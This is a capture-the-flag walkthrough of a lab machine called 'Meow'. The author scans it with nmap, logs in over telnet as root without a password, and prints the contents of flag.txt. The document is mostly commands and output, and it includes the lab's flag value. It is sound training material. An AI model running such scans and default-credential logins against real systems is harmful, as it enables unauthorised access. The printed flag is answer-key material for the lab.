Once I've opened the VPN to connect to the web server, i proceed to scan all of the target's open ports to determine the services running on it

```
cmd: sudo nmap -sV 10.129.49.165

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-09 11:35 CET
Nmap scan report for 10.129.49.165
Host is up (0.088s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.68 seconds
```

I connect to the server with telnet

```
cmd: telnet 10.129.49.165

Trying 10.129.49.165...
Connected to 10.129.49.165.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
```

At this point, it asks me to enter the username. I try with root, as I'm looking for the root flag

```
cmd: root

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 09 Nov 2023 10:41:32 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             138
  Users logged in:       0
  IPv4 address for eth0: 10.129.49.165
  IPv6 address for eth0: dead:beef::250:56ff:fe96:9b22


75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0

```

I'm in, so I take a look around with the `ll` command


```
root@Meow:~# ll
total 36
drwx------  5 root root 4096 Jun 18  2021 ./
drwxr-xr-x 20 root root 4096 Jul  7  2021 ../
lrwxrwxrwx  1 root root    9 Jun  4  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3132 Oct  6  2020 .bashrc
drwx------  2 root root 4096 Apr 21  2021 .cache/
-rw-r--r--  1 root root   33 Jun 17  2021 flag.txt
drwxr-xr-x  3 root root 4096 Apr 21  2021 .local/
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Mar 26  2021 .selected_editor
drwxr-xr-x  3 root root 4096 Apr 21  2021 snap/

```

I notice a file named `flag.txt` in the current directory, so I open the file with the `cat` command

```
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

I've found the flag:

    b40abdfe23665f766f9c61ecba8a4c19
